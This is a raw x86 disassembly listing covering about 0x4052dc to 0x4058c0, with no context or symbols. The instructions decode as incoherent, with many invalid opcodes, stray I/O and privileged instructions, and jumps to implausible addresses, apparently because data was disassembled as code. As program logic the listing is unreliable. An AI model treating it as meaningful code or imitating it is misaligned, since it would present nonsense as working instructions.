  4052dc:	83 0d 6c 00 fb 30 1c 	orl    $0x1c,0x30fb006c
  4052e3:	83 1e 36             	sbbl   $0x36,(%esi)
  4052e6:	5c                   	pop    %esp
  4052e7:	98                   	cwtl
  4052e8:	15 06 5b e4 8d       	adc    $0x8de45b06,%eax
  4052ed:	9b                   	fwait
  4052ee:	33 a2 0c 08 a0 89    	xor    -0x765ff7f4(%edx),%esp
  4052f4:	33 73 64             	xor    0x64(%ebx),%esi
  4052f7:	86 e8                	xchg   %ch,%al
  4052f9:	71 84                	jno    0x40527f
  4052fb:	39 3f                	cmp    %edi,(%edi)
  4052fd:	7c db                	jl     0x4052da
  4052ff:	3e df d1             	ds (bad)
  405302:	38 6c 1d e8          	cmp    %ch,-0x18(%ebp,%ebx,1)
  405306:	3d 24 75 38 dd       	cmp    $0xdd387524,%eax
  40530b:	a3 f7 60 34 4e       	mov    %eax,0x4e3460f7
  405310:	00 ae 53 b6 f9 74    	add    %ch,0x74f9b653(%esi)
  405316:	50                   	push   %eax
  405317:	16                   	push   %ss
  405318:	74 95                	je     0x4052af
  40531a:	43                   	inc    %ebx
  40531b:	b1 31                	mov    $0x31,%cl
  40531d:	3e 54                	ds push %esp
  40531f:	74 17                	je     0x405338
  405321:	3b 2d bf da 11 eb    	cmp    0xeb11dabf,%ebp
  405327:	26 0d fe fd e5 46    	es or  $0x46e5fdfe,%eax
  40532d:	91                   	xchg   %eax,%ecx
  40532e:	36 81 ad 91 84 23 20 	subl   $0xdbde1416,%ss:0x20238491(%ebp)
  405335:	16 14 de db 
  405339:	1c 62                	sbb    $0x62,%al
  40533b:	25 34 6e 4e b5       	and    $0xb54e6e34,%eax
  405340:	ae                   	scas   %es:(%edi),%al
  405341:	1c fb                	sbb    $0xfb,%al
  405343:	68 6e 18 1e a5       	push   $0xa51e186e
  405348:	a3 39 ac fa c7       	mov    %eax,0xc7faac39
  40534d:	1c 7b                	sbb    $0x7b,%al
  40534f:	3b 0b                	cmp    (%ebx),%ecx
  405351:	bb 8b 00 2e ba       	mov    $0xba2e008b,%ebx
  405356:	98                   	cwtl
  405357:	38 a5 1c 19 a0 12    	cmp    %ah,0x12a0191c(%ebp)
  40535d:	47                   	inc    %edi
  40535e:	73 77                	jae    0x4053d7
  405360:	69 c4 06 d3 3f 91    	imul   $0x913fd306,%esp,%eax
  405366:	af                   	scas   %es:(%edi),%eax
  405367:	c6                   	(bad)
  405368:	89 b8 ac 46 d3 ef    	mov    %edi,-0x102cb954(%eax)
  40536e:	54                   	push   %esp
  40536f:	04 0c                	add    $0xc,%al
  405371:	84 fe                	test   %bh,%dh
  405373:	0b 28                	or     (%eax),%ebp
  405375:	63 a4 24 ab 66 48 ef 	arpl   %esp,-0x10b79955(%esp)
  40537c:	8a 18                	mov    (%eax),%bl
  40537e:	d3 62 1e             	shll   %cl,0x1e(%edx)
  405381:	22 23                	and    (%ebx),%ah
  405383:	1b e1                	sbb    %ecx,%esp
  405385:	58                   	pop    %eax
  405386:	30 2b                	xor    %ch,(%ebx)
  405388:	2f                   	das
  405389:	1c 33                	sbb    $0x33,%al
  40538b:	e3 1b                	jecxz  0x4053a8
  40538d:	03 64 09 1b          	add    0x1b(%ecx,%ecx,1),%esp
  405391:	c9                   	leave
  405392:	31 54 ce 00          	xor    %edx,0x0(%esi,%ecx,8)
  405396:	9e                   	sahf
  405397:	28 24 45 0e b1 86 44 	sub    %ah,0x4486b10e(,%eax,2)
  40539e:	1c f2                	sbb    $0xf2,%al
  4053a0:	0c fe                	or     $0xfe,%al
  4053a2:	68 86 30 d0 b4       	push   $0xb4d03086
  4053a7:	85 ed                	test   %ebp,%ebp
  4053a9:	28 f4                	sub    %dh,%ah
  4053ab:	fe 89 c5 72 da 0b    	decb   0xbda72c5(%ecx)
  4053b1:	ca 27 70             	lret   $0x7027
  4053b4:	2e 9b                	cs fwait
  4053b6:	44                   	inc    %esp
  4053b7:	fb                   	sti
  4053b8:	94                   	xchg   %eax,%esp
  4053b9:	e4 fe                	in     $0xfe,%al
  4053bb:	e7 12                	out    %eax,$0x12
  4053bd:	5a                   	pop    %edx
  4053be:	12 35 be 38 83 21    	adc    0x218338be,%dh
  4053c4:	44                   	inc    %esp
  4053c5:	7e 11                	jle    0x4053d8
  4053c7:	16                   	push   %ss
  4053c8:	1d 87 4b 12 58       	sbb    $0x58124b87,%eax
  4053cd:	14 60                	adc    $0x60,%al
  4053cf:	8b 76 a4             	mov    -0x5c(%esi),%esi
  4053d2:	55                   	push   %ebp
  4053d3:	70 7a                	jo     0x40544f
  4053d5:	3e 8d 39             	lea    %ds:(%ecx),%edi
  4053d8:	33 02                	xor    (%edx),%eax
  4053da:	fa                   	cli
  4053db:	d7                   	xlat   %ds:(%ebx)
  4053dc:	88 86 a0 b4 0c ad    	mov    %al,-0x52f34b60(%esi)
  4053e2:	ce                   	into
  4053e3:	12 4f ca             	adc    -0x36(%edi),%cl
  4053e6:	61                   	popa
  4053e7:	79 04                	jns    0x4053ed
  4053e9:	44                   	inc    %esp
  4053ea:	68 e6 3b 34 bf       	push   $0xbf343be6
  4053ef:	f4                   	hlt
  4053f0:	85 e0                	test   %esp,%eax
  4053f2:	eb bc                	jmp    0x4053b0
  4053f4:	c5 6d f1             	lds    -0xf(%ebp),%ebp
  4053f7:	96                   	xchg   %eax,%esi
  4053f8:	0a 23                	or     (%ebx),%ah
  4053fa:	fd                   	std
  4053fb:	6a 52                	push   $0x52
  4053fd:	98                   	cwtl
  4053fe:	78 16                	js     0x405416
  405400:	24 35                	and    $0x35,%al
  405402:	49                   	dec    %ecx
  405403:	1a 61 3e             	sbb    0x3e(%ecx),%ah
  405406:	28 28                	sub    %ch,(%eax)
  405408:	18 93 5a 44 43 27    	sbb    %dl,0x2743445a(%ebx)
  40540e:	25 2e 30 2e c2       	and    $0xc22e302e,%eax
  405413:	f3 10 27             	repz adc %ah,(%edi)
  405416:	f4                   	hlt
  405417:	11 eb                	adc    %ebp,%ebx
  405419:	ab                   	stos   %eax,%es:(%edi)
  40541a:	6e                   	outsb  %ds:(%esi),(%dx)
  40541b:	c7 45 61 28 7b a0 71 	movl   $0x71a07b28,0x61(%ebp)
  405422:	20 f8                	and    %bh,%al
  405424:	fe 85 38 2b 4f 3c    	incb   0x3c4f2b38(%ebp)
  40542a:	12 25 8b 10 9b 1b    	adc    0x1b9b108b,%ah
  405430:	02 9c 0b f4 01 e8 04 	add    0x4e801f4(%ebx,%ecx,1),%bl
  405437:	e8 fe 0a 1e d4       	call   0xd45e5f3a
  40543c:	28 c7                	sub    %al,%bh
  40543e:	c9                   	leave
  40543f:	16                   	push   %ss
  405440:	21 71 08             	and    %esi,0x8(%ecx)
  405443:	d8 fe                	fdivr  %st(6),%st
  405445:	36 06                	ss push %es
  405447:	13 30                	adc    (%eax),%esi
  405449:	17                   	pop    %ss
  40544a:	bd ff a1 3c 0b       	mov    $0xb3ca1ff,%ebp
  40544f:	84 45 dd             	test   %al,-0x23(%ebp)
  405452:	6a 58                	push   $0x58
  405454:	37                   	aaa
  405455:	f4                   	hlt
  405456:	38 42 19             	cmp    %al,0x19(%edx)
  405459:	0b 26                	or     (%esi),%esp
  40545b:	4c                   	dec    %esp
  40545c:	17                   	pop    %ss
  40545d:	34 ae                	xor    $0xae,%al
  40545f:	d4 fe                	aam    $0xfe
  405461:	2a 2f                	sub    (%edi),%ch
  405463:	de 51 88             	ficoms -0x78(%ecx)
  405466:	b1 45                	mov    $0x45,%cl
  405468:	fb                   	sti
  405469:	06                   	push   %es
  40546a:	d8 72 bf             	fdivs  -0x41(%edx)
  40546d:	23 ea                	and    %edx,%ebp
  40546f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405470:	7a 8e                	jp     0x405400
  405472:	6c                   	insb   (%dx),%es:(%edi)
  405473:	19 08                	sbb    %ecx,(%eax)
  405475:	e4 61                	in     $0x61,%al
  405477:	22 ce                	and    %dh,%cl
  405479:	ea af e8 65 d4 74 5b 	ljmp   $0x5b74,$0xd465e8af
  405480:	1e                   	push   %ds
  405481:	4b                   	dec    %ebx
  405482:	e8 fe 1a 31 c4       	call   0xc4716f85
  405487:	52                   	push   %edx
  405488:	d5 3b                	aad    $0x3b
  40548a:	68 fd fc 93 2d       	push   $0x2d93fcfd
  40548f:	44                   	inc    %esp
  405490:	8e 63 73             	mov    0x73(%ebx),%fs
  405493:	70 35                	jo     0x4054ca
  405495:	37                   	aaa
  405496:	f4                   	hlt
  405497:	34 da                	xor    $0xda,%al
  405499:	a3 34 65 19 ea       	mov    %eax,0xea196534
  40549e:	47                   	inc    %edi
  40549f:	1d 09 36 37 8f       	sbb    $0x8f373609,%eax
  4054a4:	d4 ca                	aam    $0xca
  4054a6:	47                   	inc    %edi
  4054a7:	92                   	xchg   %eax,%edx
  4054a8:	c4 4d 7e             	les    0x7e(%ebp),%ecx
  4054ab:	60                   	pusha
  4054ac:	20 b8 f3 34 ac 86    	and    %bh,-0x7953cb0d(%eax)
  4054b2:	cc                   	int3
  4054b3:	d7                   	xlat   %ds:(%ebx)
  4054b4:	37                   	aaa
  4054b5:	8f 03                	pop    (%ebx)
  4054b7:	f2 5a                	repnz pop %edx
  4054b9:	60                   	pusha
  4054ba:	d1 4d 18             	rorl   $1,0x18(%ebp)
  4054bd:	29 49 5a             	sub    %ecx,0x5a(%ecx)
  4054c0:	01 36                	add    %esi,(%esi)
  4054c2:	90                   	nop
  4054c3:	33 32                	xor    (%edx),%esi
  4054c5:	c7 04 54 1c 67 7b c1 	movl   $0xc17b671c,(%esp,%edx,2)
  4054cc:	f7 55 e1             	notl   -0x1f(%ebp)
  4054cf:	ad                   	lods   %ds:(%esi),%eax
  4054d0:	74 42                	je     0x405514
  4054d2:	56                   	push   %esi
  4054d3:	06                   	push   %es
  4054d4:	76 54                	jbe    0x40552a
  4054d6:	96                   	xchg   %eax,%esi
  4054d7:	cb                   	lret
  4054d8:	a8 3c                	test   $0x3c,%al
  4054da:	40                   	inc    %eax
  4054db:	40                   	inc    %eax
  4054dc:	4a                   	dec    %edx
  4054dd:	9a 6b 2d 1d 46 d6 5d 	lcall  $0x5dd6,$0x461d2d6b
  4054e4:	34 44                	xor    $0x44,%al
  4054e6:	4b                   	dec    %ebx
  4054e7:	70 45                	jo     0x40552e
  4054e9:	ce                   	into
  4054ea:	4c                   	dec    %esp
  4054eb:	24 70                	and    $0x70,%al
  4054ed:	65 26 4c             	gs es dec %esp
  4054f0:	cf                   	iret
  4054f1:	25 6e 17 03 15       	and    $0x1503176e,%eax
  4054f6:	a9 5d 18 71 3c       	test   $0x3c71185d,%eax
  4054fb:	8f ca cf c0          	(bad)
  4054ff:	4c                   	dec    %esp
  405500:	44                   	inc    %esp
  405501:	62 74 65 dc          	bound  %esi,-0x24(%ebp,%eiz,2)
  405505:	40                   	inc    %eax
  405506:	3c b1                	cmp    $0xb1,%al
  405508:	01 a3 6b 0b 1a cd    	add    %esp,-0x32e5f495(%ebx)
  40550e:	a2 43 cf b4 fe       	mov    %al,0xfeb4cf43
  405513:	0b c2                	or     %edx,%eax
  405515:	3b df                	cmp    %edi,%ebx
  405517:	29 f5                	sub    %esi,%ebp
  405519:	70 ea                	jo     0x405505
  40551b:	d3 3c f6             	sarl   %cl,(%esi,%esi,8)
  40551e:	6a 9f                	push   $0xffffff9f
  405520:	c4 a8 ff 53 d3 fb    	les    -0x42cac01(%eax),%ebp
  405526:	1b ec                	sbb    %esp,%ebp
  405528:	39 b2 72 f3 c2 e8    	cmp    %esi,-0x173d0c8e(%edx)
  40552e:	40                   	inc    %eax
  40552f:	b3 8d                	mov    $0x8d,%bl
  405531:	fb                   	sti
  405532:	86 23                	xchg   %ah,(%ebx)
  405534:	8e a3 7d 11 4d 64    	mov    0x644d117d(%ebx),%fs
  40553a:	54                   	push   %esp
  40553b:	29 0c 77             	sub    %ecx,(%edi,%esi,2)
  40553e:	71 9c                	jno    0x4054dc
  405540:	3a 06                	cmp    (%esi),%al
  405542:	ac                   	lods   %ds:(%esi),%al
  405543:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405544:	51                   	push   %ecx
  405545:	9b                   	fwait
  405546:	33 35 3c 01 2f dd    	xor    0xdd2f013c,%esi
  40554c:	cb                   	lret
  40554d:	43                   	inc    %ebx
  40554e:	37                   	aaa
  40554f:	e9 61 43 a0 e7       	jmp    0xe7e098b5
  405554:	47                   	inc    %edi
  405555:	07                   	pop    %es
  405556:	14 24                	adc    $0x24,%al
  405558:	44                   	inc    %esp
  405559:	48                   	dec    %eax
  40555a:	7a 28                	jp     0x405584
  40555c:	ff 31                	push   (%ecx)
  40555e:	1d 62 a4 c4 1d       	sbb    $0x1dc4a462,%eax
  405563:	73 93                	jae    0x4054f8
  405565:	ac                   	lods   %ds:(%esi),%al
  405566:	24 e3                	and    $0xe3,%al
  405568:	b5 c1                	mov    $0xc1,%ch
  40556a:	03 f0                	add    %eax,%esi
  40556c:	fe 0b                	decb   (%ebx)
  40556e:	2a e7                	sub    %bh,%ah
  405570:	aa                   	stos   %al,%es:(%edi)
  405571:	f5                   	cmc
  405572:	7d fb                	jge    0x40556f
  405574:	13 99 16 f2 48 2f    	adc    0x2f48f216(%ecx),%ebx
  40557a:	cf                   	iret
  40557b:	6e                   	outsb  %ds:(%esi),(%dx)
  40557c:	d2 6d 24             	shrb   %cl,0x24(%ebp)
  40557f:	43                   	inc    %ebx
  405580:	1e                   	push   %ds
  405581:	c7                   	(bad)
  405582:	7e 54                	jle    0x4055d8
  405584:	15 f5 50 d8 c5       	adc    $0xc5d850f5,%eax
  405589:	26 4f                	es dec %edi
  40558b:	d0 eb                	shr    $1,%bl
  40558d:	b0 9e                	mov    $0x9e,%al
  40558f:	53                   	push   %ebx
  405590:	d8 42 02             	fadds  0x2(%edx)
  405593:	6f                   	outsl  %ds:(%esi),(%dx)
  405594:	49                   	dec    %ecx
  405595:	b5 46                	mov    $0x46,%ch
  405597:	f3 20 50 d6          	repz and %dl,-0x2a(%eax)
  40559b:	8c 00                	mov    %es,(%eax)
  40559d:	b0 9c                	mov    $0x9c,%al
  40559f:	e6 79                	out    %al,$0x79
  4055a1:	fe 04 f4             	incb   (%esp,%esi,8)
  4055a4:	24 3d                	and    $0x3d,%al
  4055a6:	e2 5d                	loop   0x405605
  4055a8:	7f 01                	jg     0x4055ab
  4055aa:	64 7b 1f             	fs jnp 0x4055cc
  4055ad:	d9 34 1d 47 67 db 22 	fnstenv 0x22db6747(,%ebx,1)
  4055b4:	70 23                	jo     0x4055d9
  4055b6:	02 98 59 4e f4 12    	add    0x12f44e59(%eax),%bl
  4055bc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4055bd:	a2 9e 76 ec e8       	mov    %al,0xe8ec769e
  4055c2:	38 ce                	cmp    %cl,%dh
  4055c4:	30 60 40             	xor    %ah,0x40(%eax)
  4055c7:	50                   	push   %eax
  4055c8:	10 53 26             	adc    %dl,0x26(%ebx)
  4055cb:	5c                   	pop    %esp
  4055cc:	38 ff                	cmp    %bh,%bh
  4055ce:	b2 0b                	mov    $0xb,%dl
  4055d0:	6b 4e a6 f3          	imul   $0xfffffff3,-0x5a(%esi),%ecx
  4055d4:	c4 af 1e d1 d1 00    	les    0xd1d11e(%edi),%ebp
  4055da:	60                   	pusha
  4055db:	76 2a                	jbe    0x405607
  4055dd:	c2 11 31             	ret    $0x3111
  4055e0:	fc                   	cld
  4055e1:	00 76 2a             	add    %dh,0x2a(%esi)
  4055e4:	1c a7                	sbb    $0xa7,%al
  4055e6:	1b 10                	sbb    (%eax),%edx
  4055e8:	33 69 0e             	xor    0xe(%ecx),%ebp
  4055eb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4055ec:	25 e6 15 eb 93       	and    $0x93eb15e6,%eax
  4055f1:	e7 ae                	out    %eax,$0xae
  4055f3:	2c 2d                	sub    $0x2d,%al
  4055f5:	8a 8e 50 00 f1 fd    	mov    -0x20effb0(%esi),%cl
  4055fb:	54                   	push   %esp
  4055fc:	7c 00                	jl     0x4055fe
  4055fe:	00 60 fd             	add    %ah,-0x3(%eax)
  405601:	54                   	push   %esp
  405602:	ac                   	lods   %ds:(%esi),%al
  405603:	eb 46                	jmp    0x40564b
  405605:	15 d4 31 5a 80       	adc    $0x805a31d4,%eax
  40560a:	00 bc 58 9e ff 3f 20 	add    %bh,0x203fff9e(%eax,%ebx,2)
  405611:	10 60 ba             	adc    %ah,-0x46(%eax)
  405614:	2d 75 83 fc 3f       	sub    $0x3ffc8375,%eax
  405619:	99                   	cltd
  40561a:	b8 8e 19 3d 00       	mov    $0x3d198e,%eax
  40561f:	55                   	push   %ebp
  405620:	fa                   	cli
  405621:	a3 ef fc 54 b1       	mov    %eax,0xb154fcef
  405626:	17                   	pop    %ss
  405627:	8e ce                	mov    %esi,%cs
  405629:	3f                   	aas
  40562a:	56                   	push   %esi
  40562b:	11 a4 24 04 33 a3 bf 	adc    %esp,-0x405cccfc(%esp)
  405632:	59                   	pop    %ecx
  405633:	02 40 5e             	add    0x5e(%eax),%al
  405636:	94                   	xchg   %eax,%esp
  405637:	6d                   	insl   (%dx),%es:(%edi)
  405638:	d6                   	salc
  405639:	f5                   	cmc
  40563a:	aa                   	stos   %al,%es:(%edi)
  40563b:	f2 1b 33             	repnz sbb (%ebx),%esi
  40563e:	6b 78 63 a4          	imul   $0xffffffa4,0x63(%eax),%edi
  405642:	9e                   	sahf
  405643:	95                   	xchg   %eax,%ebp
  405644:	61                   	popa
  405645:	e0 b3                	loopne 0x4055fa
  405647:	ae                   	scas   %es:(%edi),%al
  405648:	2e 0c fd             	cs or  $0xfd,%al
  40564b:	16                   	push   %ss
  40564c:	10 59 6f             	adc    %bl,0x6f(%ecx)
  40564f:	30 dd                	xor    %bl,%ch
  405651:	fd                   	std
  405652:	47                   	inc    %edi
  405653:	b4 1c                	mov    $0x1c,%ah
  405655:	7c 18                	jl     0x40566f
  405657:	88 e9                	mov    %ch,%cl
  405659:	93                   	xchg   %eax,%ebx
  40565a:	88 38                	mov    %bh,(%eax)
  40565c:	35 49 1a c2 0c       	xor    $0xcc21a49,%eax
  405661:	e2 fc                	loop   0x40565f
  405663:	cb                   	lret
  405664:	28 b1 c5 59 39 aa    	sub    %dh,-0x55c6a63b(%ecx)
  40566a:	20 b3 09 b9 05 fd    	and    %dh,-0x2fa46f7(%ebx)
  405670:	93                   	xchg   %eax,%ebx
  405671:	0c 40                	or     $0x40,%al
  405673:	fe                   	(bad)
  405674:	ae                   	scas   %es:(%edi),%al
  405675:	e8 9c 87 a1 2d       	call   0x2de1de16
  40567a:	3a 0e                	cmp    (%esi),%cl
  40567c:	40                   	inc    %eax
  40567d:	69 05 cc 68 35 9d eb 	imul   $0xe33209eb,0x9d3568cc,%eax
  405684:	09 32 e3 
  405687:	6e                   	outsb  %ds:(%esi),(%dx)
  405688:	11 58 2d             	adc    %ebx,0x2d(%eax)
  40568b:	e3 b5                	jecxz  0x405642
  40568d:	aa                   	stos   %al,%es:(%edi)
  40568e:	fe 8f 1b c4 b3 34    	decb   0x34b3c41b(%edi)
  405694:	80 f1 54             	xor    $0x54,%cl
  405697:	f8                   	clc
  405698:	62 1e                	bound  %ebx,(%esi)
  40569a:	91                   	xchg   %eax,%ecx
  40569b:	e4 8b                	in     $0x8b,%al
  40569d:	b3 6c                	mov    $0x6c,%bl
  40569f:	52                   	push   %edx
  4056a0:	27                   	daa
  4056a1:	d9 2c c0             	fldcw  (%eax,%eax,8)
  4056a4:	12 28                	adc    (%eax),%ch
  4056a6:	1e                   	push   %ds
  4056a7:	c7 42 82 e8 26 32 76 	movl   $0x763226e8,-0x7e(%edx)
  4056ae:	64 58                	fs pop %eax
  4056b0:	38 5c e6 6b          	cmp    %bl,0x6b(%esi,%eiz,8)
  4056b4:	c3                   	ret
  4056b5:	0e                   	push   %cs
  4056b6:	27                   	daa
  4056b7:	0d de f2 4d 0c       	or     $0xc4df2de,%eax
  4056bc:	20 74 58 4a          	and    %dh,0x4a(%eax,%ebx,2)
  4056c0:	9b                   	fwait
  4056c1:	d3 b7 48 68 2d a4    	shll   %cl,-0x5bd297b8(%edi)
  4056c7:	9c                   	pushf
  4056c8:	c6                   	(bad)
  4056c9:	35 c0 65 aa ec       	xor    $0xecaa65c0,%eax
  4056ce:	65 2a 9a 96 25 ad ff 	sub    %gs:-0x52da6a(%edx),%bl
  4056d5:	a2 d4 33 81 ab       	mov    %al,0xab8133d4
  4056da:	61                   	popa
  4056db:	ac                   	lods   %ds:(%esi),%al
  4056dc:	05 8d 16 4d 15       	add    $0x154d168d,%eax
  4056e1:	02 a9 6b b4 7d 8d    	add    -0x72824b95(%ecx),%ch
  4056e7:	46                   	inc    %esi
  4056e8:	2d 0b 29 c4 d0       	sub    $0xd0c4290b,%eax
  4056ed:	30 22                	xor    %ah,(%edx)
  4056ef:	10 10                	adc    %dl,(%eax)
  4056f1:	ef                   	out    %eax,(%dx)
  4056f2:	b6 10                	mov    $0x10,%dh
  4056f4:	c2 3e 2e             	ret    $0x2e3e
  4056f7:	22 39                	and    (%ecx),%bh
  4056f9:	d9 0a                	(bad) (%edx)
  4056fb:	57                   	push   %edi
  4056fc:	f6 92 e3 a4 a6 13    	notb   0x13a6a4e3(%edx)
  405702:	39 18                	cmp    %ebx,(%eax)
  405704:	54                   	push   %esp
  405705:	84 a1 a9 4e 1d 66    	test   %ah,0x661d4ea9(%ecx)
  40570b:	9c                   	pushf
  40570c:	3a ce                	cmp    %dh,%cl
  40570e:	54                   	push   %esp
  40570f:	58                   	pop    %eax
  405710:	3b a2 c5 1c db 1c    	cmp    0x1cdb1cc5(%edx),%esp
  405716:	ce                   	into
  405717:	05 d5 a8 42 7a       	add    $0x7a42a8d5,%eax
  40571c:	0a 06                	or     (%esi),%al
  40571e:	62 84 70 6a 28 04 a9 	bound  %eax,-0x56fbd796(%eax,%esi,2)
  405725:	c5 34 49             	lds    (%ecx,%ecx,2),%esi
  405728:	04 27                	add    $0x27,%al
  40572a:	2c 26                	sub    $0x26,%al
  40572c:	4b                   	dec    %ebx
  40572d:	3c 07                	cmp    $0x7,%al
  40572f:	73 00                	jae    0x405731
  405731:	eb 6e                	jmp    0x4057a1
  405733:	31 cd                	xor    %ecx,%ebp
  405735:	8b 59 08             	mov    0x8(%ecx),%ebx
  405738:	1e                   	push   %ds
  405739:	74 51                	je     0x40578c
  40573b:	6c                   	insb   (%dx),%es:(%edi)
  40573c:	60                   	pusha
  40573d:	82 3c 8b e0          	cmpb   $0xe0,(%ebx,%ecx,4)
  405741:	fe 0b                	decb   (%ebx)
  405743:	95                   	xchg   %eax,%ebp
  405744:	2f                   	das
  405745:	be 21 f4 19 ed       	mov    $0xed19f421,%esi
  40574a:	1a 62 c0             	sbb    -0x40(%edx),%ah
  40574d:	e8 b3 6e 28 9b       	call   0x9b68c605
  405752:	10 14 47             	adc    %dl,(%edi,%eax,2)
  405755:	bb c9 c0 0b 9a       	mov    $0x9a0bc0c9,%ebx
  40575a:	11 fe                	adc    %edi,%esi
  40575c:	d9 8f e3 8a 08 96    	(bad) -0x69f7751d(%edi)
  405762:	74 57                	je     0x4057bb
  405764:	33 2c 66             	xor    (%esi,%eiz,2),%ebp
  405767:	9c                   	pushf
  405768:	e5 3e                	in     $0x3e,%eax
  40576a:	e2 5e                	loop   0x4057ca
  40576c:	f0 e0 95             	lock loopne 0x405704
  40576f:	d6                   	salc
  405770:	69 87 ed 63 d1 66 87 	imul   $0x4d347987,0x66d163ed(%edi),%eax
  405777:	79 34 4d 
  40577a:	68 58 d7 4b c2       	push   $0xc24bd758
  40577f:	fe                   	(bad)
  405780:	1e                   	push   %ds
  405781:	27                   	daa
  405782:	54                   	push   %esp
  405783:	20 42 a6             	and    %al,-0x5a(%edx)
  405786:	1d 17 f0 15 69       	sbb    $0x6915f017,%eax
  40578b:	55                   	push   %ebp
  40578c:	61                   	popa
  40578d:	76 07                	jbe    0x405796
  40578f:	a3 72 29 ab 3c       	mov    %eax,0x3cab2972
  405794:	e6 40                	out    %al,$0x40
  405796:	b3 49                	mov    $0x49,%bl
  405798:	17                   	pop    %ss
  405799:	38 0a                	cmp    %cl,(%edx)
  40579b:	f4                   	hlt
  40579c:	03 eb                	add    %ebx,%ebp
  40579e:	ab                   	stos   %eax,%es:(%edi)
  40579f:	3f                   	aas
  4057a0:	90                   	nop
  4057a1:	c4 05 24 ec 08 1c    	les    0x1c08ec24,%eax
  4057a7:	d1 af 15 54 1a 8c    	shrl   $1,-0x73e5abeb(%edi)
  4057ad:	a3 e3 16 54 41       	mov    %eax,0x415416e3
  4057b2:	69 6b db c7 6b 41 b8 	imul   $0xb8416bc7,-0x25(%ebx),%ebp
  4057b9:	81 0c 01 9e 2a 23 27 	orl    $0x27232a9e,(%ecx,%eax,1)
  4057c0:	e4 fe                	in     $0xfe,%al
  4057c2:	a9 68 7a e2 1e       	test   $0x1ee27a68,%eax
  4057c7:	2a b4 c2 2d eb 2f c0 	sub    -0x3fd014d3(%edx,%eax,8),%dh
  4057ce:	88 b0 ef e4 ca 6b    	mov    %dh,0x6bcae4ef(%eax)
  4057d4:	78 eb                	js     0x4057c1
  4057d6:	50                   	push   %eax
  4057d7:	5e                   	pop    %esi
  4057d8:	7e f4                	jle    0x4057ce
  4057da:	b2 02                	mov    $0x2,%dl
  4057dc:	a0 4c ed dc 28       	mov    0x28dced4c,%al
  4057e1:	78 26                	js     0x405809
  4057e3:	4c                   	dec    %esp
  4057e4:	3e ea 28 1a 47 9e d8 	ds ljmp $0xd6d8,$0x9e471a28
  4057eb:	d6 
  4057ec:	c1 fe db             	sar    $0xdb,%esi
  4057ef:	60                   	pusha
  4057f0:	fb                   	sti
  4057f1:	26 a3 74 43 fb f1    	mov    %eax,%es:0xf1fb4374
  4057f7:	ef                   	out    %eax,(%dx)
  4057f8:	e0 c3                	loopne 0x4057bd
  4057fa:	22 e0                	and    %al,%ah
  4057fc:	4d                   	dec    %ebp
  4057fd:	0d 76 2b 00 1b       	or     $0x1b002b76,%eax
  405802:	06                   	push   %es
  405803:	14 15                	adc    $0x15,%al
  405805:	03 46 17             	add    0x17(%esi),%eax
  405808:	21 2d 46 68 dc 05    	and    %ebp,0x5dc6846
  40580e:	b5 a2                	mov    $0xa2,%ch
  405810:	99                   	cltd
  405811:	3a 2c 0c             	cmp    (%esp,%ecx,1),%ch
  405814:	da 20                	fisubl (%eax)
  405816:	b2 ef                	mov    $0xef,%dl
  405818:	0b 20                	or     (%eax),%esp
  40581a:	12 5e 98             	adc    -0x68(%esi),%bl
  40581d:	58                   	pop    %eax
  40581e:	35 48 6c ec 18       	xor    $0x18ec6c48,%eax
  405823:	3e c7                	ds (bad)
  405825:	48                   	dec    %eax
  405826:	45                   	inc    %ebp
  405827:	76 68                	jbe    0x405891
  405829:	3b fe                	cmp    %esi,%edi
  40582b:	2d 43 5a 24 b7       	sub    $0xb7245a43,%eax
  405830:	28 18                	sub    %bl,(%eax)
  405832:	26 90                	es nop
  405834:	7b 4c                	jnp    0x405882
  405836:	08 08                	or     %cl,(%eax)
  405838:	db 17                	fistl  (%edi)
  40583a:	1e                   	push   %ds
  40583b:	23 04 3d 2f 04 77 ce 	and    -0x3188fbd1(,%edi,1),%eax
  405842:	3b 8e 2c 0d 53 c6    	cmp    -0x39acf2d4(%esi),%ecx
  405848:	08 c5                	or     %al,%ch
  40584a:	95                   	xchg   %eax,%ebp
  40584b:	30 79 3c             	xor    %bh,0x3c(%ecx)
  40584e:	60                   	pusha
  40584f:	ea 4e 10 fd f4 11 9b 	ljmp   $0x9b11,$0xf4fd104e
  405856:	0e                   	push   %cs
  405857:	16                   	push   %ss
  405858:	7e 9d                	jle    0x4057f7
  40585a:	04 bb                	add    $0xbb,%al
  40585c:	11 59 ca             	adc    %ebx,-0x36(%ecx)
  40585f:	03 43 2f             	add    0x2f(%ebx),%eax
  405862:	06                   	push   %es
  405863:	94                   	xchg   %eax,%esp
  405864:	c0 11 25             	rclb   $0x25,(%ecx)
  405867:	11 f3                	adc    %esi,%ebx
  405869:	f2 35 88 7f 0d 54    	repnz xor $0x540d7f88,%eax
  40586f:	de 15 e9 73 ca c9    	ficoms 0xc9ca73e9
  405875:	6d                   	insl   (%dx),%es:(%edi)
  405876:	44                   	inc    %esp
  405877:	c3                   	ret
  405878:	28 ca                	sub    %cl,%dl
  40587a:	02 fa                	add    %dl,%bh
  40587c:	36 e1 9f             	ss loope 0x40581e
  40587f:	08 de                	or     %bl,%dh
  405881:	3a 98 fe 41 f5 22    	cmp    0x22f541fe(%eax),%bl
  405887:	c7 83 22 7e 68 9c c7 	movl   $0x681c65c7,-0x639781de(%ebx)
  40588e:	65 1c 68 
  405891:	25 67 15 46 fc       	and    $0xfc461567,%eax
  405896:	58                   	pop    %eax
  405897:	db 8f a6 85 f5 31    	fisttpl 0x31f585a6(%edi)
  40589d:	38 fc                	cmp    %bh,%ah
  40589f:	f8                   	clc
  4058a0:	3e 5b                	ds pop %ebx
  4058a2:	18 18                	sbb    %bl,(%eax)
  4058a4:	34 1d                	xor    $0x1d,%al
  4058a6:	e7 b4                	out    %eax,$0xb4
  4058a8:	08 20                	or     %ah,(%eax)
  4058aa:	c7                   	(bad)
  4058ab:	79 3a                	jns    0x4058e7
  4058ad:	cf                   	iret
  4058ae:	00 5f 66             	add    %bl,0x66(%edi)
  4058b1:	3a 26                	cmp    (%esi),%ah
  4058b3:	c8 c2 86 e7          	enter  $0x86c2,$0xe7
  4058b7:	e7 b4                	out    %eax,$0xb4
  4058b9:	d8 d8                	fcomp  %st(0)
  4058bb:	c8 fe f5 7e          	enter  $0xf5fe,$0x7e
  4058bf:	4e                   	dec    %esi
  4058c0:	c7                   	(bad)
